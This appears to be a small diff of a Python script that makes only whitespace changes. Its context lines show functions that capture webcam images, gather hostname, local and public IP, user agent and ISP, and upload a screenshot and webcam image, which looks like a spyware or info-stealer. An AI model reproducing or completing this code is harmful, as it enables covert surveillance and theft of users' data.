@@ -26,7 +26,7 @@ def webcam():
         return webcam_path
     cam.release()
     return None
-
+    
 def d_info():
     hostname = socket.gethostname()
     local_ip = socket.gethostbyname(hostname)
@@ -38,7 +38,6 @@ def d_info():
     return hostname, local_ip, user_agent, public_ip, isp
 
 # send the info
-
 def send(screenshot_path, webcam_path, hostname, local_ip, user_agent, public_ip, isp):
     files = {
         "file1": open(screenshot_path, "rb"),
